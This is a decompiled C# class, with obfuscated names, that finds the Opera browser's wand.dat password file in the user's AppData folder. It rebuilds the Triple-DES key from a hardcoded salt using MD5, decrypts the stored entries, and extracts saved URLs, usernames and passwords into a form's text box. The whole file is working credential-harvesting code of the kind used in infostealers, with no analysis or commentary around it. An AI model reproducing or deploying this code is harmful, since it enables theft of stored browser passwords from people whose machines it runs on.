using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000021 RID: 33
public class GClass1
{
	// Token: 0x0600007F RID: 127 RVA: 0x00005228 File Offset: 0x00003428
	static GClass1()
	{
		// Note: this type is marked as 'beforefieldinit'.
	}

	// Token: 0x06000080 RID: 128 RVA: 0x000052BC File Offset: 0x000034BC
	public GClass1()
	{
		this.int_0 = 0;
		this.int_1 = 0;
		this.bool_0 = true;
		this.string_6 = new string[1001];
		this.string_7 = new string[1001];
		this.string_8 = new string[1001];
		this.int_2 = 0;
	}

	// Token: 0x06000081 RID: 129 RVA: 0x0000531C File Offset: 0x0000351C
	public object method_0()
	{
		if (File.Exists(GClass1.string_0 + "\\Opera\\Opera\\wand.dat"))
		{
			GClass1.string_0 += "\\Opera\\Opera\\wand.dat";
			this.method_1();
		}
		else if (File.Exists(GClass1.string_0 + "\\Opera\\Opera\\profile\\wand.dat"))
		{
			GClass1.string_0 += "\\Opera\\Opera\\profile\\wand.dat";
			this.method_1();
		}
		object result;
		return result;
	}

	// Token: 0x06000082 RID: 130 RVA: 0x0000538C File Offset: 0x0000358C
	private void method_1()
	{
		checked
		{
			try
			{
				byte[] array = File.ReadAllBytes(GClass1.string_0);
				int num = 0;
				int num2 = array.Length - 5;
				for (int i = num; i <= num2; i++)
				{
					if (array[i] == 0 && array[i + 1] == 0 && array[i + 2] == 0 && array[i + 3] == 8)
					{
						int num3 = (int)array[i + 15];
						byte[] array2 = new byte[8];
						byte[] array3 = new byte[num3 - 1 + 1];
						Array.Copy(array, i + 4, array2, 0, array2.Length);
						Array.Copy(array, i + 16, array3, 0, array3.Length);
						this.string_1 = Conversions.ToString(Operators.AddObject(this.string_1, Operators.ConcatenateObject(this.method_2(array2, array3), "\r\n")));
						i += 11 + num3;
					}
				}
				string[] array4 = this.string_1.Split(new char[]
				{
					Conversions.ToChar(Environment.NewLine)
				});
				int num4 = 0;
				do
				{
					array4[num4] = null;
					num4++;
				}
				while (num4 <= 3);
				int num5 = 0;
				int num6 = array4.Length - 1;
				for (int j = num5; j <= num6; j++)
				{
					this.string_3 = null;
					this.string_4 = null;
					this.string_5 = null;
					this.int_0 = 0;
					try
					{
						if (array4[j].Contains("http://"))
						{
							if (j != 0)
							{
								try
								{
									int num7 = 0;
									int num8 = array4[j].Length - 1;
									for (int k = num7; k <= num8; k++)
									{
										if (array4[j][k - this.int_0] > '\u007f')
										{
											array4[j] = array4[j].Remove(k - this.int_0, 1);
											this.int_0++;
										}
									}
									if (j - this.int_2 == 1)
									{
										this.string_3 = array4[j];
									}
									else if (j - this.int_2 == 2)
									{
										this.string_3 = array4[j];
									}
									this.int_2 = j;
								}
								catch (Exception ex)
								{
								}
							}
						}
						else if (array4[j].Contains("https://"))
						{
							if (j != 0)
							{
								try
								{
									int num9 = 0;
									int num10 = array4[j].Length - 1;
									for (int l = num9; l <= num10; l++)
									{
										if (array4[j][l - this.int_0] > '\u007f')
										{
											array4[j] = array4[j].Remove(l - this.int_0, 1);
											this.int_0++;
										}
									}
									if (j - this.int_2 == 1)
									{
										this.string_3 = array4[j];
									}
									else if (j - this.int_2 == 2)
									{
										this.string_3 = array4[j];
									}
									this.int_2 = j;
								}
								catch (Exception ex2)
								{
								}
							}
						}
						else if (this.int_2 != 0)
						{
							if (j == this.int_2 + 2)
							{
								try
								{
									int num11 = 0;
									int num12 = array4[j].Length - 1;
									for (int m = num11; m <= num12; m++)
									{
										if (array4[j][m - this.int_0] > '\u007f')
										{
											array4[j] = array4[j].Remove(m - this.int_0, 1);
											this.int_0++;
										}
									}
									this.string_4 = array4[j];
									goto IL_3BA;
								}
								catch (Exception ex3)
								{
									goto IL_3BA;
								}
							}
							if (j == this.int_2 + 4)
							{
								try
								{
									int num13 = 0;
									int num14 = array4[j].Length - 1;
									for (int n = num13; n <= num14; n++)
									{
										if (array4[j][n - this.int_0] > '\u007f')
										{
											array4[j] = array4[j].Remove(n - this.int_0, 1);
											this.int_0++;
										}
									}
									this.string_5 = array4[j];
									this.int_1++;
								}
								catch (Exception ex4)
								{
								}
							}
						}
						IL_3BA:;
					}
					catch (Exception ex5)
					{
					}
					try
					{
						if (Operators.CompareString(this.string_3, null, false) != 0)
						{
							this.string_6[this.int_1] = this.string_3;
						}
						if (Operators.CompareString(this.string_4, null, false) != 0)
						{
							this.string_7[this.int_1] = this.string_4;
						}
						if (Operators.CompareString(this.string_5, null, false) != 0)
						{
							try
							{
								this.string_8[this.int_1 - 1] = this.string_5;
							}
							catch (Exception ex6)
							{
							}
						}
					}
					catch (Exception ex7)
					{
					}
				}
			}
			catch (Exception ex8)
			{
				Console.WriteLine(ex8.Message);
			}
			int num15 = 0;
			int num16 = this.string_6.Length;
			for (int num17 = num15; num17 <= num16; num17++)
			{
				if (Operators.CompareString(this.string_6[num17], "", false) == 0)
				{
					break;
				}
				TextBox textBox = Class1.MyForms_0.Form1_0.TextBox1;
				textBox.Text = textBox.Text + this.string_6[num17].Replace("\0", "").Replace("\n", "") + "\r\n";
				textBox = Class1.MyForms_0.Form1_0.TextBox1;
				textBox.Text = textBox.Text + this.string_7[num17].Replace("\0", "").Replace("\n", "") + "\r\n";
				textBox = Class1.MyForms_0.Form1_0.TextBox1;
				textBox.Text = textBox.Text + this.string_8[num17].Replace("\0", "").Replace("\n", "") + "\r\n";
			}
		}
	}

	// Token: 0x06000083 RID: 131 RVA: 0x00005A08 File Offset: 0x00003C08
	public object method_2(byte[] byte_2, byte[] byte_3)
	{
		checked
		{
			object result;
			try
			{
				MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
				md5CryptoServiceProvider.Initialize();
				byte[] array = new byte[GClass1.byte_0.Length + (byte_2.Length - 1) + 1];
				Array.Copy(GClass1.byte_0, array, GClass1.byte_0.Length);
				Array.Copy(byte_2, 0, array, GClass1.byte_0.Length, byte_2.Length);
				byte[] array2 = md5CryptoServiceProvider.ComputeHash(array);
				array = new byte[array2.Length + GClass1.byte_0.Length + (byte_2.Length - 1) + 1];
				Array.Copy(array2, array, array2.Length);
				Array.Copy(GClass1.byte_0, 0, array, array2.Length, GClass1.byte_0.Length);
				Array.Copy(byte_2, 0, array, array2.Length + GClass1.byte_0.Length, byte_2.Length);
				byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(array);
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
				byte[] array3 = new byte[24];
				byte[] array4 = new byte[8];
				Array.Copy(array2, array3, array2.Length);
				Array.Copy(sourceArray, 0, array3, array2.Length, 8);
				Array.Copy(sourceArray, 8, array4, 0, 8);
				tripleDESCryptoServiceProvider.Key = array3;
				tripleDESCryptoServiceProvider.IV = array4;
				ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
				byte[] bytes = cryptoTransform.TransformFinalBlock(byte_3, 0, byte_3.Length);
				string @string = Encoding.Unicode.GetString(bytes);
				result = @string;
			}
			catch (Exception ex)
			{
				result = "";
			}
			return result;
		}
	}

	// Token: 0x0400003B RID: 59
	private static byte[] byte_0 = new byte[]
	{
		131,
		125,
		252,
		15,
		142,
		179,
		232,
		105,
		115,
		175,
		byte.MaxValue
	};

	// Token: 0x0400003C RID: 60
	private static byte[] byte_1 = new byte[]
	{
		0,
		0,
		0,
		8
	};

	// Token: 0x0400003D RID: 61
	private static string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	// Token: 0x0400003E RID: 62
	public string string_1;

	// Token: 0x0400003F RID: 63
	private int int_0;

	// Token: 0x04000040 RID: 64
	private int int_1;

	// Token: 0x04000041 RID: 65
	private bool bool_0;

	// Token: 0x04000042 RID: 66
	private string string_2;

	// Token: 0x04000043 RID: 67
	private string string_3;

	// Token: 0x04000044 RID: 68
	private string string_4;

	// Token: 0x04000045 RID: 69
	private string string_5;

	// Token: 0x04000046 RID: 70
	private string[] string_6;

	// Token: 0x04000047 RID: 71
	private string[] string_7;

	// Token: 0x04000048 RID: 72
	private string[] string_8;

	// Token: 0x04000049 RID: 73
	private int int_2;
}
